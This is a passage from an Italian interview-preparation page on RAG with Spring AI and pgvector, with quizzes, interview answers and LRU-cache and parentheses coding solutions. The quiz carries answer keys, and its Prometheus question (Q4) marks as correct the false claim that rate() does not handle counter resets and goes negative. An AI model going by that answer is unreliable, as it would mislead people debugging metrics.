"Procedura per il refund"       → [0.11, -0.35, 0.85, ..., 0.24]  // Molto simile!
"Meteo di domani"               → [0.92, 0.11, -0.45, ..., 0.78]  // Molto diverso

// Cosine similarity
similarity("rimborso", "refund") = 0.95  // Alta
similarity("rimborso", "meteo")  = 0.12  // Bassa</code></pre>

                <h4>Implementazione RAG con Spring AI</h4>

                <pre><code class="language-java">// pom.xml
// spring-ai-openai-spring-boot-starter
// spring-ai-pgvector-store-spring-boot-starter

@Configuration
public class RagConfig {

    @Bean
    public EmbeddingModel embeddingModel() {
        return new OpenAiEmbeddingModel(
            new OpenAiApi(System.getenv("OPENAI_API_KEY"))
        );
    }

    @Bean
    public VectorStore vectorStore(EmbeddingModel embeddingModel, JdbcTemplate jdbc) {
        return new PgVectorStore(jdbc, embeddingModel);
    }
}

@Service
public class DocumentIngestionService {

    private final VectorStore vectorStore;

    // 1. INDEXING: Carica documenti nel vector store
    public void ingestDocuments(List&lt;Resource&gt; documents) {
        // Text Splitter: divide documenti in chunks
        TokenTextSplitter splitter = new TokenTextSplitter(
            500,    // chunk size (tokens)
            100,    // overlap (per mantenere contesto)
            5,      // min chunk size
            10000,  // max chunks per doc
            true    // keep separator
        );

        for (Resource doc : documents) {
            // Parse document (PDF, HTML, etc.)
            TikaDocumentReader reader = new TikaDocumentReader(doc);
            List&lt;Document&gt; parsed = reader.get();

            // Split in chunks
            List&lt;Document&gt; chunks = splitter.apply(parsed);

            // Add metadata per ogni chunk
            chunks.forEach(chunk -> {
                chunk.getMetadata().put("source", doc.getFilename());
                chunk.getMetadata().put("ingested_at", Instant.now().toString());
            });

            // Store: embedding automatico + salvataggio in vector DB
            vectorStore.add(chunks);
        }
    }
}

@Service
public class RagChatService {

    private final VectorStore vectorStore;
    private final ChatClient chatClient;

    // 2. RETRIEVAL + GENERATION
    public String askQuestion(String userQuestion) {
        // Similarity search nel vector store
        List&lt;Document&gt; relevantDocs = vectorStore.similaritySearch(
            SearchRequest.query(userQuestion)
                .withTopK(5)                    // Top 5 chunks più rilevanti
                .withSimilarityThreshold(0.7)  // Soglia minima di similarità
        );

        // Costruisci il prompt con contesto
        String context = relevantDocs.stream()
            .map(doc -> String.format(
                "[Source: %s]\n%s",
                doc.getMetadata().get("source"),
                doc.getContent()
            ))
            .collect(Collectors.joining("\n\n---\n\n"));

        String systemPrompt = """
            Sei un assistente aziendale. Rispondi alle domande basandoti
            ESCLUSIVAMENTE sul contesto fornito. Se l'informazione non è
            nel contesto, rispondi "Non ho informazioni su questo argomento".
            Cita sempre la fonte tra parentesi [Source: nomefile].
            """;

        String userPrompt = String.format("""
            CONTESTO:
            %s

            DOMANDA:
            %s
            """, context, userQuestion);

        // Chiamata LLM
        return chatClient.prompt()
            .system(systemPrompt)
            .user(userPrompt)
            .call()
            .content();
    }
}</code></pre>

                <h3>Vector Databases: Dove Vivono gli Embeddings</h3>

                <p>I <strong>Vector Databases</strong> sono database specializzati per storage e ricerca efficiente di vettori ad alta dimensionalità. Usano algoritmi come <strong>HNSW</strong> (Hierarchical Navigable Small World) o <strong>IVF</strong> (Inverted File Index) per ricerca approssimata in tempo sub-lineare.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Database</th>
                            <th>Tipo</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Pinecone</strong></td>
                            <td>Managed SaaS</td>
                            <td>Zero ops, scalabile, filtering metadata</td>
                            <td>Vendor lock-in, costo</td>
                        </tr>
                        <tr>
                            <td><strong>Weaviate</strong></td>
                            <td>Open source</td>
                            <td>GraphQL API, hybrid search, self-hosted</td>
                            <td>Più complesso da gestire</td>
                        </tr>
                        <tr>
                            <td><strong>Milvus</strong></td>
                            <td>Open source</td>
                            <td>Altamente scalabile, multi-index</td>
                            <td>Curva di apprendimento</td>
                        </tr>
                        <tr>
                            <td><strong>pgvector</strong></td>
                            <td>PostgreSQL extension</td>
                            <td>Usa il DB esistente, ACID, SQL familiare</td>
                            <td>Performance limitate su scala molto grande</td>
                        </tr>
                        <tr>
                            <td><strong>Qdrant</strong></td>
                            <td>Open source</td>
                            <td>Rust (performance), filtering avanzato</td>
                            <td>Ecosistema più giovane</td>
                        </tr>
                    </tbody>
                </table>

                <h4>pgvector: Vector Search in PostgreSQL</h4>

                <pre><code class="language-sql">-- Abilita l'estensione
CREATE EXTENSION IF NOT EXISTS vector;

-- Tabella per documenti con embedding
CREATE TABLE documents (
    id SERIAL PRIMARY KEY,
    content TEXT NOT NULL,
    metadata JSONB,
    embedding vector(1536),  -- OpenAI ada-002 = 1536 dimensioni
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Indice per ricerca veloce (HNSW)
CREATE INDEX ON documents
USING hnsw (embedding vector_cosine_ops)
WITH (m = 16, ef_construction = 64);

-- Query: trova i 5 documenti più simili
SELECT id, content, metadata,
       1 - (embedding &lt;=&gt; '[0.12, -0.34, ...]'::vector) AS similarity
FROM documents
WHERE metadata->>'category' = 'policies'  -- Filtering
ORDER BY embedding &lt;=&gt; '[0.12, -0.34, ...]'::vector
LIMIT 5;</code></pre>

                <h3>Advanced RAG Patterns</h3>

                <div class="info-box">
                    <h4>Chunking Strategies</h4>
                    <p>La qualità del RAG dipende molto da come dividi i documenti:</p>
                    <ul>
                        <li><strong>Fixed-size chunks</strong>: Semplice, ma può tagliare frasi a metà</li>
                        <li><strong>Sentence-based</strong>: Rispetta i confini delle frasi</li>
                        <li><strong>Recursive/Hierarchical</strong>: Prova separatori diversi (paragrafo → frase → caratteri)</li>
                        <li><strong>Semantic chunking</strong>: Usa embedding per trovare punti di rottura naturali</li>
                    </ul>
                </div>

                <h4>Hybrid Search: Best of Both Worlds</h4>

                <p>La <strong>Hybrid Search</strong> combina ricerca semantica (vector) con ricerca keyword (BM25/full-text). Utile quando l'utente cerca termini esatti (codici prodotto, nomi) che la ricerca semantica potrebbe perdere.</p>

                <pre><code class="language-java">// Pseudo-codice Hybrid Search
public List&lt;Document&gt; hybridSearch(String query) {
    // 1. Vector search (semantica)
    List&lt;Document&gt; semanticResults = vectorStore.similaritySearch(query, topK=10);

    // 2. Keyword search (BM25/full-text)
    List&lt;Document&gt; keywordResults = fullTextSearch(query, topK=10);

    // 3. Reciprocal Rank Fusion (RRF) - combina i ranking
    Map&lt;String, Double&gt; scores = new HashMap&lt;&gt;();
    int k = 60; // parametro RRF

    for (int i = 0; i &lt; semanticResults.size(); i++) {
        String id = semanticResults.get(i).getId();
        scores.merge(id, 1.0 / (k + i + 1), Double::sum);
    }

    for (int i = 0; i &lt; keywordResults.size(); i++) {
        String id = keywordResults.get(i).getId();
        scores.merge(id, 1.0 / (k + i + 1), Double::sum);
    }

    // 4. Ordina per score combinato
    return scores.entrySet().stream()
        .sorted(Map.Entry.&lt;String, Double&gt;comparingByValue().reversed())
        .limit(5)
        .map(e -> getDocumentById(e.getKey()))
        .toList();
}</code></pre>

                <h4>Query Transformation</h4>

                <p>A volte la query dell'utente è troppo vaga o ambigua. Tecniche di <strong>query transformation</strong>:</p>

                <ul>
                    <li><strong>Query Expansion</strong>: Usa l'LLM per generare query alternative ("rimborso" → "rimborso", "refund", "restituzione denaro")</li>
                    <li><strong>HyDE (Hypothetical Document Embedding)</strong>: Genera un documento ipotetico che risponderebbe alla query, poi cerca documenti simili a quello</li>
                    <li><strong>Step-back Prompting</strong>: Risali a una domanda più generale prima di cercare</li>
                </ul>

                <h3>Considerazioni Architetturali</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Considerazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Latency</strong></td>
                            <td>RAG aggiunge ~200-500ms (embedding query + vector search). Cache le query frequenti.</td>
                        </tr>
                        <tr>
                            <td><strong>Cost</strong></td>
                            <td>Embedding: ~$0.0001/1K tokens. LLM: ~$0.01-0.03/1K tokens. Il contesto RAG aumenta i token.</td>
                        </tr>
                        <tr>
                            <td><strong>Freshness</strong></td>
                            <td>I documenti cambiano? Implementa pipeline di re-indexing (incrementale o full).</td>
                        </tr>
                        <tr>
                            <td><strong>Security</strong></td>
                            <td>Access control: filtra risultati per permessi utente. Non esporre dati sensibili nel contesto.</td>
                        </tr>
                        <tr>
                            <td><strong>Evaluation</strong></td>
                            <td>Metriche: Retrieval accuracy (hai trovato i chunk giusti?), Answer quality, Hallucination rate.</td>
                        </tr>
                    </tbody>
                </table>
            </section>

            <!-- Quiz Section Modulo 6 -->
            <section class="quiz-section" id="modulo6-quiz">
                <h2>Interactive Challenge Quiz - Modulo 6</h2>
                <p>Verifica la tua comprensione degli Advanced Topics 2026 con queste domande di livello Hard.</p>

                <!-- Question 26 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> In un sistema con OpenTelemetry, hai configurato il sampling al 10%. Un trace inizia nel servizio A, chiama B, poi C. Il trace è stato selezionato per il sampling in A. Cosa succede in B e C?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q26" id="q26a" value="a">
                            <label for="q26a">B e C fanno sampling indipendente: potrebbero non tracciare le loro parti</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q26" id="q26b" value="b">
                            <label for="q26b">B e C tracciano sempre perché il sampling si applica solo all'entry point</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q26" id="q26c" value="c">
                            <label for="q26c">B e C ereditano la decisione di sampling da A via context propagation</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q26" id="q26d" value="d">
                            <label for="q26d">B e C controllano il collector centrale per decidere se tracciare</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q26')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q26"></div>
                </div>

                <!-- Question 27 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Stai facendo terraform plan e vedi: <code>aws_instance.app must be replaced</code>. Cosa significa e perché è importante?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q27" id="q27a" value="a">
                            <label for="q27a">L'istanza verrà aggiornata in-place con le nuove configurazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q27" id="q27b" value="b">
                            <label for="q27b">L'istanza verrà distrutta e ricreata, causando downtime se non gestito</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q27" id="q27c" value="c">
                            <label for="q27c">Terraform creerà una nuova istanza mantenendo la vecchia come backup</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q27" id="q27d" value="d">
                            <label for="q27d">È solo un warning: l'istanza non verrà modificata senza conferma esplicita</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q27')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q27"></div>
                </div>

                <!-- Question 28 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Nel tuo sistema RAG, gli utenti si lamentano che le risposte non trovano informazioni che sai essere nei documenti. La similarity threshold è 0.8. L'embedding model usa cosine similarity. Quale potrebbe essere il problema?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q28" id="q28a" value="a">
                            <label for="q28a">I documenti sono troppo lunghi e superano la context window</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q28" id="q28b" value="b">
                            <label for="q28b">Il vector database non ha abbastanza memoria per tutti gli embeddings</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q28" id="q28c" value="c">
                            <label for="q28c">L'LLM sta allucinando invece di usare il contesto fornito</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q28" id="q28d" value="d">
                            <label for="q28d">La threshold 0.8 è troppo alta: query diverse nel wording ma simili nel significato vengono scartate</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q28')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q28"></div>
                </div>

                <!-- Question 29 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> Il tuo Prometheus mostra che http_requests_total ha avuto un reset (drop a 0) alle 14:32. La query <code>rate(http_requests_total[5m])</code> alle 14:35 restituisce valori negativi. Perché e come risolvi?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q29" id="q29a" value="a">
                            <label for="q29a">rate() non gestisce i reset: usa increase() o irate() che compensano automaticamente</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q29" id="q29b" value="b">
                            <label for="q29b">Il counter è stato implementato male: dovrebbe usare un Gauge invece</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q29" id="q29c" value="c">
                            <label for="q29c">Prometheus ha un bug: i counter non dovrebbero mai resettarsi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q29" id="q29d" value="d">
                            <label for="q29d">Devi aggiungere un filtro per escludere i punti dopo il reset</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q29')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q29"></div>
                </div>

                <!-- Question 30 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Due sviluppatori eseguono terraform apply contemporaneamente sullo stesso state (senza state locking). Dev1 aggiunge una subnet, Dev2 modifica un security group. Qual è il rischio?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q30" id="q30a" value="a">
                            <label for="q30a">Nessun rischio: Terraform serializza automaticamente le operazioni</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q30" id="q30b" value="b">
                            <label for="q30b">Entrambe le modifiche falliranno con un errore di conflitto</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q30" id="q30c" value="c">
                            <label for="q30c">Lo state può corrompersi: il secondo apply potrebbe sovrascrivere lo state del primo</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q30" id="q30d" value="d">
                            <label for="q30d">Le risorse verranno create duplicate con nomi diversi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q30')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q30"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 6 -->
            <section class="section" id="modulo6-questions">
                <h2>Domande da Colloquio - Modulo 6</h2>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra monitoring e observability. Perché l'observability è importante nei sistemi distribuiti?</h4>
                    <p><strong>Risposta attesa:</strong> Il monitoring è reattivo: definisci metriche e alert in anticipo per problemi che ti aspetti. Funziona bene per problemi noti ("CPU alta → alert"). L'observability è esplorativa: ti permette di investigare problemi che non avevi previsto, correlando dati (logs, metrics, traces) per capire "perché il sistema si comporta così". Nei sistemi distribuiti, il numero di possibili failure mode cresce esponenzialmente con i servizi. Non puoi prevedere ogni combinazione di fallimenti, quindi hai bisogno di dati ricchi (traces, structured logs) per fare debugging post-hoc.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come funziona il context propagation in distributed tracing? Cosa succede se un servizio non lo implementa?</h4>
                    <p><strong>Risposta attesa:</strong> Il context propagation passa trace ID e span ID tra servizi, tipicamente via HTTP headers standardizzati (W3C Trace Context: <code>traceparent</code>, <code>tracestate</code>) o headers specifici del vendor (Jaeger: <code>uber-trace-id</code>). Il servizio chiamante inietta il contesto negli headers, il chiamato lo estrae e lo usa per creare span figli. Se un servizio non implementa la propagation, il trace si "rompe": gli span dopo quel servizio sembreranno trace separati, perdendo la correlazione. Il trace risulterà incompleto e il troubleshooting sarà difficile.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Terraform plan mostra che una risorsa "must be replaced". Come eviti downtime?</h4>
                    <p><strong>Risposta attesa:</strong> "Must be replaced" significa che la modifica richiede distruzione e ricreazione (es. cambio di AMI, instance type su alcuni cloud, cambio di subnet). Per evitare downtime: 1) Usa <code>lifecycle { create_before_destroy = true }</code> per creare la nuova risorsa prima di distruggere la vecchia. 2) Per risorse critiche, implementa blue-green: crea una nuova risorsa con nome diverso, sposta il traffico, poi rimuovi la vecchia dal codice. 3) Per ASG/managed services, il replacement può essere gestito dal cloud provider (es. ASG instance refresh). Importante: fai sempre <code>terraform plan</code> prima di apply e review attento dei "replace".</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come gestisci i secrets in Terraform? Cosa NON dovresti mai fare?</h4>
                    <p><strong>Risposta attesa:</strong> MAI: 1) Hardcodare secrets nei .tf files, 2) Committare tfvars con secrets in Git, 3) Usare local state (contiene secrets in plain text). Best practices: 1) Usa secret managers (AWS Secrets Manager, HashiCorp Vault) e referenziali via data sources. 2) Passa secrets come variabili d'ambiente (<code>TF_VAR_db_password</code>). 3) Usa remote state con encryption at rest (S3 con SSE). 4) Per CI/CD, usa secret injection della piattaforma (GitHub Secrets, GitLab CI variables). 5) Considera strumenti come SOPS per encrypted tfvars se necessario.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega come funziona RAG e perché lo useresti invece di fine-tuning.</h4>
                    <p><strong>Risposta attesa:</strong> RAG (Retrieval Augmented Generation) combina ricerca semantica con generazione LLM. Workflow: 1) Indexing: documenti → chunking → embedding → vector store. 2) Query: query utente → embedding → similarity search → top-K chunks → prompt augmentation → LLM → risposta. Preferisco RAG a fine-tuning perché: 1) Più economico e veloce (no training). 2) Dati aggiornabili senza re-training (basta re-indicizzare). 3) Citazione delle fonti (l'LLM "mostra il suo lavoro"). 4) Riduce hallucination (il modello risponde basandosi su contesto concreto). Fine-tuning è meglio per cambiare lo "stile" o insegnare task nuovi, non per knowledge injection.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali sono i trade-off nella scelta della chunk size per RAG?</h4>
                    <p><strong>Risposta attesa:</strong> Chunk piccoli (~256 token): Pro: più precisi nel retrieval (meno noise), più chunks nel context budget. Contro: possono perdere contesto necessario (frase senza premessa), più chunks da processare. Chunk grandi (~1024 token): Pro: più contesto per chunk, meno rischio di tagliare informazioni correlate. Contro: più noise (informazioni irrilevanti nel chunk), meno chunks nel context budget, similarity score "diluito". Best practice: inizia con ~512 token + overlap di ~50 token. Poi A/B testa basandoti su retrieval accuracy. Per documenti strutturati (codice, legal), usa semantic chunking rispettando i confini naturali.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti l'access control in un sistema RAG con documenti di diversi livelli di confidenzialità?</h4>
                    <p><strong>Risposta attesa:</strong> Due approcci principali: 1) Filtering post-retrieval: retrieval aperto, poi filtra i risultati in base ai permessi dell'utente. Semplice ma inefficiente (recuperi documenti che poi scarti). 2) Filtering pre-retrieval (preferito): aggiungi metadata ai chunks (es. <code>access_level</code>, <code>department</code>), poi usa metadata filtering nella query vector (es. pgvector: <code>WHERE metadata->>'access_level' &lt;= user_level</code>). Questo è supportato nativamente da Pinecone, Weaviate, etc. Attenzione: il prompt finale NON deve mai contenere documenti non autorizzati, anche se l'LLM li "ignorerebbe" - potrebbero essere estratti con prompt injection.</p>
                </div>
            </section>

            <!-- ==================== MODULO 7: CODING CHALLENGES ==================== -->

            <header class="module-header" id="modulo7">
                <span class="module-tag">Modulo 7</span>
                <h1>Coding Challenges</h1>
                <p>Esercizi classici da colloquio tecnico con soluzioni commentate e analisi della complessità</p>
            </header>

            <!-- LRU Cache Section -->
            <section class="section" id="modulo7-lru">
                <h2>LRU Cache</h2>

                <p>La <strong>LRU Cache</strong> (Least Recently Used Cache) è una delle strutture dati più richieste nei colloqui tecnici. Implementa una cache con capacità limitata che, quando è piena, rimuove l'elemento usato meno di recente.</p>

                <div class="info-box">
                    <h4>Requisiti del Problema</h4>
                    <p>Implementa una struttura dati che supporti le seguenti operazioni in <strong>O(1)</strong>:</p>
                    <ul>
                        <li><code>get(key)</code>: Ritorna il valore se la chiave esiste, altrimenti -1</li>
                        <li><code>put(key, value)</code>: Inserisce o aggiorna il valore. Se la cache è piena, rimuove l'elemento LRU</li>
                    </ul>
                </div>

                <h3>Approccio: HashMap + Doubly Linked List</h3>

                <p>Per ottenere O(1) sia per accesso che per rimozione, combiniamo due strutture:</p>
                <ul>
                    <li><strong>HashMap</strong>: accesso O(1) per chiave → nodo della lista</li>
                    <li><strong>Doubly Linked List</strong>: rimozione O(1) e mantenimento dell'ordine di utilizzo</li>
                </ul>

                <div class="diagram">
                    <pre>
HashMap                           Doubly Linked List
┌─────────────────┐              ┌──────────────────────────────────────────────┐
│  key → Node     │              │                                              │
├─────────────────┤              │  HEAD ←→ [A] ←→ [B] ←→ [C] ←→ TAIL          │
│  "A" → Node[A]  │──────────────│──────────┘       │       │                  │
│  "B" → Node[B]  │──────────────│──────────────────┘       │                  │
│  "C" → Node[C]  │──────────────│──────────────────────────┘                  │
└─────────────────┘              │                                              │
                                 │  MRU (Most Recently Used) ←──────→ LRU      │
                                 └──────────────────────────────────────────────┘

Operazioni O(1):
- get("B"): HashMap lookup → muovi Node[B] dopo HEAD
- put("D"): rimuovi nodo prima di TAIL (LRU), inserisci dopo HEAD
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class LRUCache {

    // Nodo della doubly linked list
    private class Node {
        int key, value;
        Node prev, next;

        Node(int key, int value) {
            this.key = key;
            this.value = value;
        }
    }

    private final int capacity;
    private final Map&lt;Integer, Node&gt; cache;  // HashMap per O(1) lookup
    private final Node head, tail;            // Sentinelle della lista

    public LRUCache(int capacity) {
        this.capacity = capacity;
        this.cache = new HashMap&lt;&gt;();

        // Inizializza sentinelle (semplificano edge cases)
        head = new Node(0, 0);
        tail = new Node(0, 0);
        head.next = tail;
        tail.prev = head;
    }

    public int get(int key) {
        if (!cache.containsKey(key)) {
            return -1;
        }

        Node node = cache.get(key);
        // Aggiorna: questo nodo è stato usato ora (MRU)
        removeNode(node);
        addToFront(node);

        return node.value;
    }

    public void put(int key, int value) {
        if (cache.containsKey(key)) {
            // Aggiorna valore esistente
            Node node = cache.get(key);
            node.value = value;
            removeNode(node);
            addToFront(node);
        } else {
            // Inserisci nuovo
            if (cache.size() == capacity) {
                // Rimuovi LRU (nodo prima di tail)
                Node lru = tail.prev;
                removeNode(lru);
                cache.remove(lru.key);  // Importante: rimuovi anche dalla HashMap!
            }

            Node newNode = new Node(key, value);
            cache.put(key, newNode);
            addToFront(newNode);
        }
    }

    // Helper: rimuove un nodo dalla lista (O(1) grazie ai puntatori)
    private void removeNode(Node node) {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }

    // Helper: aggiunge un nodo subito dopo head (MRU position)
    private void addToFront(Node node) {
        node.next = head.next;
        node.prev = head;
        head.next.prev = node;
        head.next = node;
    }
}</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">from collections import OrderedDict

class LRUCache:
    """
    Python ha OrderedDict che mantiene l'ordine di inserimento
    e supporta move_to_end() in O(1) - perfetto per LRU!
    """

    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1

        # Sposta alla fine (MRU)
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            # Aggiorna e sposta in fondo
            self.cache[key] = value
            self.cache.move_to_end(key)
        else:
            if len(self.cache) >= self.capacity:
                # popitem(last=False) rimuove il primo elemento (LRU)
                self.cache.popitem(last=False)
            self.cache[key] = value


# Esempio d'uso
cache = LRUCache(2)
cache.put(1, 1)       # cache: {1=1}
cache.put(2, 2)       # cache: {1=1, 2=2}
print(cache.get(1))   # returns 1, cache: {2=2, 1=1}
cache.put(3, 3)       # evicts key 2, cache: {1=1, 3=3}
print(cache.get(2))   # returns -1 (not found)</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Operazione</th>
                            <th>Time Complexity</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>get(key)</code></td>
                            <td><strong>O(1)</strong></td>
                            <td>HashMap lookup O(1) + rimozione/inserimento lista O(1)</td>
                        </tr>
                        <tr>
                            <td><code>put(key, value)</code></td>
                            <td><strong>O(1)</strong></td>
                            <td>HashMap insert/update O(1) + operazioni lista O(1)</td>
                        </tr>
                    </tbody>
                </table>

                <p><strong>Space Complexity:</strong> O(capacity) - memorizziamo al massimo <code>capacity</code> elementi</p>

                <div class="info-box warning">
                    <h4>Errori Comuni da Evitare</h4>
                    <ul>
                        <li>Dimenticare di rimuovere la chiave dalla HashMap quando si fa eviction</li>
                        <li>Non gestire correttamente l'update di un valore esistente (deve diventare MRU)</li>
                        <li>Usare una sola struttura (es. solo LinkedHashMap) senza capire il meccanismo sottostante</li>
                    </ul>
                </div>
            </section>

            <!-- Valid Parentheses Section -->
            <section class="section" id="modulo7-parentheses">
                <h2>Valid Parentheses</h2>

                <p>Questo problema classico verifica se una stringa contenente solo parentesi <code>(){}[]</code> è valida, ovvero se ogni parentesi aperta ha una corrispondente chiusa nell'ordine corretto.</p>

                <div class="info-box">
                    <h4>Esempi</h4>
                    <ul>
                        <li><code>"()"</code> → <strong>true</strong></li>
                        <li><code>"()[]{}"</code> → <strong>true</strong></li>
                        <li><code>"(]"</code> → <strong>false</strong></li>
                        <li><code>"([)]"</code> → <strong>false</strong> (ordine sbagliato)</li>
                        <li><code>"{[]}"</code> → <strong>true</strong> (nested correttamente)</li>
                    </ul>
                </div>

                <h3>Approccio: Stack</h3>

                <p>Lo <strong>Stack</strong> è la struttura dati perfetta: le parentesi devono essere chiuse nell'ordine inverso di apertura (LIFO - Last In, First Out).</p>

                <div class="diagram">
                    <pre>
Input: "({[]})"

Passo 1: '(' → push      Stack: [(]
Passo 2: '{' → push      Stack: [(, {]
Passo 3: '[' → push      Stack: [(, {, []
Passo 4: ']' → pop '['   Stack: [(, {]     ✓ match
Passo 5: '}' → pop '{'   Stack: [(]        ✓ match
Passo 6: ')' → pop '('   Stack: []         ✓ match
Fine: Stack vuoto → VALID

Input: "([)]"

Passo 1: '(' → push      Stack: [(]
Passo 2: '[' → push      Stack: [(, []
Passo 3: ')' → pop '['   Stack: [(]        ✗ ')' ≠ ']' → INVALID
                    </pre>
                </div>

                <h3>Soluzione Java</h3>

                <pre><code class="language-java">class Solution {
    public boolean isValid(String s) {
        // Stack per tenere traccia delle parentesi aperte
        Deque&lt;Character&gt; stack = new ArrayDeque&lt;&gt;();

        // Mappa per matching: chiusa → aperta corrispondente
        Map&lt;Character, Character&gt; pairs = Map.of(
            ')', '(',
            '}', '{',
            ']', '['
        );

        for (char c : s.toCharArray()) {
            if (pairs.containsValue(c)) {
                // È una parentesi aperta: push
                stack.push(c);
            } else if (pairs.containsKey(c)) {
                // È una parentesi chiusa: verifica match
                if (stack.isEmpty() || stack.pop() != pairs.get(c)) {
                    return false;
                }
            }
            // Ignora altri caratteri (se presenti)
        }

        // Valido solo se tutte le parentesi sono state chiuse
        return stack.isEmpty();
    }
}

// Versione compatta senza Map (più veloce in pratica)
class SolutionOptimized {
    public boolean isValid(String s) {
        Deque&lt;Character&gt; stack = new ArrayDeque&lt;&gt;();

        for (char c : s.toCharArray()) {
            // Quando incontri un'aperta, pusha la chiusa corrispondente
            if (c == '(') stack.push(')');
            else if (c == '{') stack.push('}');
            else if (c == '[') stack.push(']');
            // Quando incontri una chiusa, verifica che sia quella attesa
            else if (stack.isEmpty() || stack.pop() != c) {
                return false;
            }
        }

        return stack.isEmpty();
    }
}</code></pre>

                <h3>Soluzione Python</h3>

                <pre><code class="language-python">def isValid(s: str) -> bool:
    stack = []
    pairs = {')': '(', '}': '{', ']': '['}

    for char in s:
        if char in pairs.values():  # Parentesi aperta
            stack.append(char)
        elif char in pairs:  # Parentesi chiusa
            if not stack or stack.pop() != pairs[char]:
                return False

    return len(stack) == 0


# Versione one-liner (meno leggibile, ma elegante)
def isValid_oneliner(s: str) -> bool:
    while '()' in s or '{}' in s or '[]' in s:
        s = s.replace('()', '').replace('{}', '').replace('[]', '')
    return s == ''
# Nota: questa versione è O(n²) - NON usare in produzione!</code></pre>

                <h3>Analisi della Complessità</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>Complessità</th>
                            <th>Spiegazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Time</td>
                            <td><strong>O(n)</strong></td>
                            <td>Singolo passaggio sulla stringa, ogni operazione stack è O(1)</td>
                        </tr>
                        <tr>
                            <td>Space</td>
                            <td><strong>O(n)</strong></td>
                            <td>Nel caso peggiore (tutte aperte), lo stack contiene n elementi</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Varianti del Problema</h4>
                    <ul>
                        <li><strong>Minimum Add to Make Valid</strong>: Quante parentesi aggiungere per rendere valida la stringa?</li>
                        <li><strong>Longest Valid Parentheses</strong>: Sottostringa più lunga di parentesi valide (più difficile, richiede DP)</li>
                        <li><strong>Remove Invalid Parentheses</strong>: Rimuovi il minimo numero per ottenere tutte le stringhe valide</li>
                    </ul>
                </div>
            </section>

            <!-- Merge Intervals Section -->
            <section class="section" id="modulo7-intervals">
                <h2>Merge Intervals</h2>

                <p>Dato un array di intervalli <code>[[start, end], ...]</code>, unisci tutti gli intervalli che si sovrappongono.</p>

                <div class="info-box">
                    <h4>Esempi</h4>
                    <ul>
                        <li><code>[[1,3],[2,6],[8,10],[15,18]]</code> → <code>[[1,6],[8,10],[15,18]]</code></li>
                        <li><code>[[1,4],[4,5]]</code> → <code>[[1,5]]</code> (i bordi si toccano)</li>
